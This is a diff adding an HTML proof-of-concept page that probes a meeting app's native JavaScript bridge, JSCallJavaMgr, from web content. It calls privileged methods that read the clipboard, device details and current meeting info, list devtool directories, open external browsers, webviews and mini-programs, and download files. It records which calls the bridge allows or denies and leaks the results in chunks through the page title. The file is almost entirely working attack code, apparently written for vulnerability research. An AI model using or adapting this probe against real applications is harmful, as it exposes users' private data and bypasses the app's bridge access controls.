@@ -1,0 +1,73 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P5B</h1>
+<script>
+document.title='WM-POC-P5B';
+function note(t){ document.title=String(t); }
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+var rows=[], finished=false;
+function norm(res){
+  if(typeof res==='string'){
+    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:res.slice(0,60)}; }
+  }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var id=res.callId||'?';
+  var code=res.code;
+  var msg=String(res.message||'');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
+  rows.push((deny?'D':'A')+':' + id + ':' + code + ':' + msg.replace(/\|/g,'/').slice(0,40));
+};
+function dump(){
+  if(!rows.length){ note('CB P5B-EMPTY'); return; }
+  var blob=rows.join('|');
+  var i=0, n=0;
+  function chunk(){
+    if(i>=blob.length){ note('CB P5B-DONE n='+rows.length); return; }
+    note('CB '+n+' '+blob.slice(i, i+90));
+    i+=90; n++;
+    setTimeout(chunk, 1200);
+  }
+  chunk();
+}
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('CommonPlugin','GetPerformance',{}); },
+  function(){ call('DevicePlugin','GetDeviceInfo',{}); },
+  function(){ call('DevicePlugin','CheckUpgrade',{}); },
+  function(){ call('CommonPlugin','GetClipboard',{}); },
+  function(){ call('CommonPlugin','GetServerTimestampMsec',{}); },
+  function(){ call('CommonPlugin','GetCurrentMeetingInfo',{}); },
+  function(){ call('CommonPlugin','GetWebPageRunningContext',{}); },
+  function(){ call('CommonPlugin','PrintLog',{level:1,msg:'p5'}); },
+  function(){ call('CommonPlugin','RouterToExternalBrowser',{url:'https://httpbin.org/html'}); },
+  function(){ call('CommonPlugin','OpenOperationUrl',{url:'https://httpbin.org/html'}); },
+  function(){ call('CommonPlugin','LaunchMiniProgram',{originId:'gh_ebae2dbaabf7',path:'/pages/index/index',miniProgramType:0}); },
+  function(){ call('UIPlugin','LoadTemplateWebView',{url:'https://httpbin.org/html'}); },
+  function(){ call('UIPlugin','LaunchTransparentWebview',{url:'https://httpbin.org/html'}); },
+  function(){ call('UIPlugin','ShowToast',{title:'p5'}); },
+  function(){ call('OpenApiPlugin','GetOpenAppInfo',{}); },
+  function(){ call('MonitorPlugin','AddLog',{type:1,msg:'p5'}); },
+  function(){ call('DevtoolWebviewPlugin','GetOfflineEnable',{}); },
+  function(){ call('DevtoolWebviewPlugin','GetOfflineDirList',{}); },
+  function(){ call('DevtoolWebviewPlugin','GetMockSwitchState',{}); },
+  function(){ call('IdeaWebViewPlugin','DownloadIdeaFile',{url:'https://httpbin.org/bytes/16'}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ setTimeout(dump, 1800); return; }
+  try{ steps[i](); }catch(e){ rows.push('EX:'+e); }
+  i++;
+  setTimeout(next, 650);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
